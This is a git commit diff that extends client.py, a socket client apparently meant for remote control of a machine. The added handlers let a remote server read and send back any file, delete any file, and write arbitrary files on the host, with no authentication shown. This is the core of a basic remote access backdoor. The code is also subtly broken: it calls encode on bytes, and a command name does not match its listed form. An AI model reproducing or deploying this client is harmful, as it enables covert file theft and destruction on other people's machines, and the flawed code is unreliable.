6d7638d7c1bde9f7cb6fef43fc2dac5f6009af59
Stoney290 <61219282+Stoney290@users.noreply.github.com>
2020-08-11 13:31:03 +0530

    Update client.py

--- client.py
+++ client.py
@@ -1,3 +1,5 @@
+#commands = view_cwd ,custom_dir , download_file ,remove_file , send_file
+
 import os
 import socket
 
@@ -14,7 +16,7 @@ while 1:
     command = command.decode ()
     print ("Command recieved")
     print ("")
-    if command == "view cwd":
+    if command == "view_cwd":
             files = os.getcwd()
             files = str(files)
             s.send (files.encode())
@@ -31,6 +33,33 @@ while 1:
             print ("")
             print ("Command has been executed successfully..")
             print ("")
+
+    elif command == "download_file":
+            file_path = s.recv(5000)
+            file_path = file_path.decode ()
+            file = open(file_path, "rb")
+            data = file.read ()
+            s.send(data.encode())
+            print ("")
+            print("File has been sent successfully")
+            print ("")
+
+    elif command == "remove_file":
+            fileanddir = s.recv (6000)
+            fileanddir = fileanddir.decode ()
+            os.remove (fileanddir)
+            print ("")
+            print ("Command has been executed successfully")
+            print ("")
+
+    elif command == "send_files":
+            filename = s.recv (6000)
+            print(filename)
+            new_file = open(filename, "wb")
+            data = s.recv (6000)
+            print(data)
+            new_file.write (data)
+            new_file.close()
 
     else:
             print ("")
